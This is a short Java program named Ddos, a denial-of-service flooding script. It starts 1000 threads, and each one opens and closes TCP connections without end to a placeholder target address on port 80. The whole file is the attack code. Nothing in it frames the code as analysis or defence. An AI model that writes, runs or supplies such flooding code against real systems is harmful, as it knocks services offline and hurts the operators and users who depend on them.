import java.net.*;

public class Ddos {
  public static void main(String[] args) throws Exception {
    String ipAddress = "TARGET_IP_ADDRESS";
    int port = 80;
    int numThreads = 1000;

    for (int i = 0; i < numThreads; i++) {
      Thread thread = new Thread(new Runnable() {
        public void run() {
          try {
            while (true) {
              Socket socket = new Socket(ipAddress, port);
              socket.close();
            }
          } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
          }
        }
      });
      thread.start();
    }
  }
}
